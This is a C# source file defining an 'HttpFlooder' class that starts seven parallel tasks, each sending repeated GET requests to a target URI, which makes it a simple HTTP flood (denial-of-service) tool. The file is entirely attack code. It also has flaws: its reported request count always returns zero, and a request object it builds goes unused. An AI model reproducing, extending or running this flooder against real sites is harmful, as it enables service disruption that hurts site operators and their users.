using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Devlonic.HTTPFlooder.Core {
    public class HttpFlooder {
        private HttpClient http;

        public HttpFlooder(HttpClient http) {
            ServicePointManager.DefaultConnectionLimit = 5;
            this.http = http;
            //this.http.Timeout = TimeSpan.FromMilliseconds(1000);
        }

        public async Task<long> StartFloodAsync(Uri target, long countRequests, bool ignoreFault = false) {
            long countRequestsSent = 0;
            List<Task> tasks = new List<Task>();
            for ( int i = 0; i < 7; i++ ) {
                tasks.Add(FloodTask(countRequests, target));
            }

            await Task.WhenAll(tasks);

            return countRequestsSent;
        }

        private async Task FloodTask(long count, Uri target) {
            Console.WriteLine($"Task {Thread.CurrentThread.ManagedThreadId} start");
            HttpRequestMessage message = new HttpRequestMessage() {
                Method = HttpMethod.Get,
                RequestUri = target,
            };
            for ( long i = 0; i < count; i++ ) {
                try {
                    var responce = await http.GetAsync(target);
                    Console.WriteLine(responce.StatusCode);
                }
                catch ( HttpRequestException e ) {
                    Console.WriteLine(e.Message);
                }
            }
        }
    }
}
